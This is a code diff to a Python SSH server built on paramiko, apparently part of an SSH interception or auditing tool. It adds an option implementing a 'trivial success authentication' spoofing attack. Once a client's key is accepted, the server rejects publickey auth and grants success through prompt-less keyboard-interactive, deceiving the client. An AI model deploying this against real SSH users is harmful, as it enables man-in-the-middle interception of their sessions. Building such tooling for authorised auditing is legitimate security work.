@@ -90,6 +90,12 @@ class ServerInterface(BaseServerInterface):
             help='enable "none" authentication'
         )
         plugin_group.add_argument(
+            '--enable-trivial-auth',
+            dest='enable_trivial_auth',
+            action='store_true',
+            help='enables "trivial success authentication" spoofing attack'
+        )
+        plugin_group.add_argument(
             '--enable-keyboard-interactive-auth',
             dest='enable_keyboard_interactive_auth',
             action='store_true',
@@ -183,7 +189,7 @@ class ServerInterface(BaseServerInterface):
         allowed_auths = []
         if self.args.extra_auth_methods:
             allowed_auths.extend(self.args.extra_auth_methods.split(','))
-        if self.args.enable_keyboard_interactive_auth:
+        if self.args.enable_keyboard_interactive_auth or self.args.enable_trivial_auth:
             allowed_auths.append('keyboard-interactive')
         if not self.args.disable_pubkey_auth:
             allowed_auths.append('publickey')
@@ -205,20 +211,23 @@ class ServerInterface(BaseServerInterface):
         return paramiko.common.AUTH_FAILED
 
     @typechecked
-    def check_auth_interactive(self, username: Text, submethods: Text) -> Union[int, paramiko.server.InteractiveQuery]:
+    def check_auth_interactive(self, username: Text, submethods: Union[bytes, Text]) -> Union[int, paramiko.server.InteractiveQuery]:
         logging.debug("check_auth_interactive: username=%s, submethods=%s", username, submethods)
-        if not self.args.enable_keyboard_interactive_auth:
+        is_trivial_auth = self.args.enable_trivial_auth and self.session.accepted_key is not None
+        logging.debug("trivial authentication possible")
+        if not self.args.enable_keyboard_interactive_auth and not is_trivial_auth:
             return paramiko.common.AUTH_FAILED
         self.session.username = username
         iq = paramiko.server.InteractiveQuery()
-        if not self.args.disable_keyboard_interactive_prompts:
+        if not self.args.disable_keyboard_interactive_prompts and not is_trivial_auth:
             iq.add_prompt("Password (kb-interactive): ", False)
         return iq
 
     @typechecked
     def check_auth_interactive_response(self, responses: List[Text]) -> Union[int, paramiko.server.InteractiveQuery]:
         logging.debug("check_auth_interactive_response: responses=%s", responses)
-        if self.args.disable_keyboard_interactive_prompts:
+        is_trivial_auth = self.args.enable_trivial_auth and self.session.accepted_key is not None
+        if self.args.disable_keyboard_interactive_prompts or is_trivial_auth:
             self.session.authenticator.authenticate(self.session.username, key=None)
             return paramiko.common.AUTH_SUCCESSFUL
         if not responses:
@@ -249,6 +258,9 @@ class ServerInterface(BaseServerInterface):
         auth_result: int = self.session.authenticator.authenticate(username, key=key)
         if auth_result == paramiko.common.AUTH_SUCCESSFUL:
             self.session.accepted_key = key
+        if self.session.accepted_key is not None and self.args.enable_trivial_auth:
+            logging.debug("found valid key for trivial authentication")
+            return paramiko.common.AUTH_FAILED
         if self.args.disallow_publickey_auth:
             return paramiko.common.AUTH_FAILED
         return auth_result
